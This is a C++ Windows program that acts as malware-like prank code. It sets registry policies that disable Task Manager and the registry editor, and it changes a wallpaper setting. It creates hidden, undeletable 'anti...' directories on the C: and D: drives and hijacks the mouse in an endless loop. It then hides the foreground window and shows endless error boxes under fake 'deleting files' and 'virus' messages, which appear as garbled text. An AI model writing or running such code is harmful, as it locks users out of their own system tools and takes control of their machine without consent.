#include<bits/stdc++.h>
#include<windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <cstring>
#include <time.h>
#include <string>
using namespace std;
void SetImmunity(char *FilePath,char *FileName)

{

char file[2048] = { 0 };



strncpy(file, FilePath, strlen(FilePath));

strcat(file, FileName);

BOOL bRet = CreateDirectory(file, NULL);

if (bRet)

{

strcat(file, "\\anti...\\");

bRet = CreateDirectory(file, NULL);

if (bRet)

{

SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN);

}

}

}





void RegTaskmanagerForbidden()

{

HKEY hkey;

DWORD value = 1;

RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);

RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));

RegCloseKey(hkey);

}





void RegEditForbidden()

{

HKEY hkey;

DWORD value = 1;

RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);

RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));

RegCloseKey(hkey);

}





void RegModifyBackroud()

{

DWORD value = 1;

HKEY hkey;

RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);

RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);

RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));

}

void mouse()

{

srand (time(0));

int x,y;

while(1)

{

x=rand()%1000+300;

y=rand()%600+300;

SetCursorPos(x,y);

}

}
int main(int argc, char * argv[]){
RegTaskmanagerForbidden();

RegEditForbidden();

RegModifyBackroud();



TCHAR Destop[MAX_PATH];

SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);


SetImmunity("d://", "Chairria Katie");
SetImmunity("c://", "Chairria Katie");



mouse();
	system("color 4");
	for(int i=1;i<=3;i++){
		cout<<"!";
		Sleep(1000);
		system("cls");
		Sleep(1000);
    }
    system("cls");
    system("color 7");
    cout<<"�������֣�"<<endl;
    Sleep(100);
    cout<<"�������֣�";
    Sleep(1000);
    system("cls");
    cout<<"ϵͳ�Ų���";
    Sleep(1000); 
    system("cls");
    cout<<"�ļ�ɾ����";
	for(int i=1;i<=10;i++){
		cout<<"*";
		Sleep(100); 
	}
	cout<<endl;
	cout<<"���ɾ����";
	for(int i=1;i<=10;i++){
		cout<<"*";
		Sleep(100);
	}
	cout<<endl;
	cout<<"ɱ�����ɾ����";
	for(int i=1;i<=10;i++){
		cout<<"*";
		Sleep(100);
	}
	cout<<endl;
	cout<<"����ֲ����";
	for(int i=1;i<=10;i++){
		cout<<"*";
		Sleep(100);
	}
	system("cls");
	cout<<"@";
	Sleep(1000);
	system("cls");
	cout<<"ϵͳ����";
	Sleep(1000);
	system("cls");
	srand(time(0));
	system("color 4");
	for(int i=1;i<=10;i++){
		cout<<"!"<<" "; 
		Sleep(10);
    }
    system("cls");
    for(int i=1;i<=2000;i++){
		cout<<"jdjfkfdjflkdfoervoreuroejrrejfsjforeorsioerlsklfkflskdsdijoidsf";
	}
	system("color 14");
	for(int i=1;1;i++){
		if(i==2000){
			while(1){
        		HWND hWnd=GetForegroundWindow();
        		ShowWindow(hWnd,SW_HIDE);
        		MessageBox(NULL, TEXT("��ĵ������˲�����"), TEXT("����"), MB_OK | MB_ICONERROR);
    		}
		}
		cout<<"jdjfkfdjflkdfoervoreuroejrrejfsjforeorsioerlsklfkflskdsdijoidsf";
	}
	return 0;
}
